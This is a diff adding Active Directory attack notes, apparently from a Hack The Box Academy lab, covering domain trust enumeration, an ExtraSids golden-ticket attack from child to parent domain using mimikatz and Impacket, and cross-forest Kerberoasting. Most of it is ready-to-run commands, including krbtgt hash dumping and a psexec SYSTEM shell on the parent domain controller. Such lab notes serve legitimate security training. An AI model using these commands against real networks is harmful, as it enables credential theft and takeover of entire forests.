@@ -394,8 +394,112 @@ Connect:
 evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
 ```
 
+### Trust Enumeration
+
+Before any cross-domain or cross-forest attack, map the trusts:
+
+```bash
+## Built-in ActiveDirectory module
+Import-Module activedirectory
+Get-ADTrust -Filter *
+
+## PowerView
+Get-DomainTrust
+Get-DomainTrustMapping
+Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
+
+## netdom
+netdom query /domain:inlanefreight.local trust
+netdom query /domain:inlanefreight.local dc
+netdom query /domain:inlanefreight.local workstation
+```
+
+BloodHound's *Map domain trusts* canned query gives you the same map visually.
+
+### ExtraSids Attack (Child → Parent Compromise)
+
+Compromise of a child domain → full forest if SID filtering isn't enforced. You forge a golden ticket in the child that claims membership in the parent's Enterprise Admins group via the `sids` extension.
+
+You need:
+
+1. **KRBTGT hash + SID + FQDN** of the child domain.
+2. **A username in the child** (it doesn't have to exist — anything works).
+3. **The SID of the parent forest's Enterprise Admins group**.
+
+Collect the krbtgt hash with mimikatz:
+
+```bash
+mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
+```
+
+Get the Enterprise Admins SID via PowerView:
+
+```bash
+Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" |
+    select distinguishedname,objectsid
+```
+
+#### Forge with mimikatz
+
+```bash
+mimikatz.exe
+kerberos::golden /user:hacker \
+    /domain:LOGISTICS.INLANEFREIGHT.LOCAL \
+    /sid:S-1-5-21-2806153819-209893948-922872689 \
+    /krbtgt:9d765b482771505cbe97411065964d5f \
+    /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
+
+klist                              # confirm ticket in cache
+
+## Now act as DA in the parent forest
+ls \\academy-ea-dc01.inlanefreight.local\c$
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL `
+    /dc:academy-ea-dc01.inlanefreight.local /user:INLANEFREIGHT\administrator
+```
+
+#### Forge with Impacket (from Linux)
+
+```bash
+## Dump the child KRBTGT hash
+impacket-secretsdump logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \
+    -just-dc-user LOGISTICS/krbtgt
+
+## Pull the domain SID
+impacket-lookupsid logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
+
+## Forge the inter-realm TGT
+impacket-ticketer \
+    -nthash 9d765b482771505cbe97411065964d5f \
+    -domain LOGISTICS.INLANEFREIGHT.LOCAL \
+    -domain-sid S-1-5-21-2806153819-209893948-922872689 \
+    -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \
+    hacker
+
+export KRB5CCNAME=hacker.ccache
+
+## SYSTEM shell on the parent DC
+impacket-psexec LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local \
+    -k -no-pass -target-ip 172.16.5.5
+```
+
+#### Cross-Forest — Kerberoast Across the Trust
+
+If the trust direction lets you query the other forest, enumerate and roast directly:
+
+```bash
+## From Windows
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |
+    select samaccountname,memberof
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+
+## From Linux
+GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
+```
+
 ### Reference
 
 - Harmj0y's AD ACL cheatsheet: <https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993>
 - Impacket toolkit: <https://github.com/fortra/impacket>
 - Password Attacks walkthrough (great for AES engagement): <https://medium.com/@moustafaabdelmaksoud/password-attacks-skill-assessment-htb-academy-39b1f52e9010>
+- HTB module scenarios reference: <https://academy.hackthebox.com/app/module/143/section/1262>
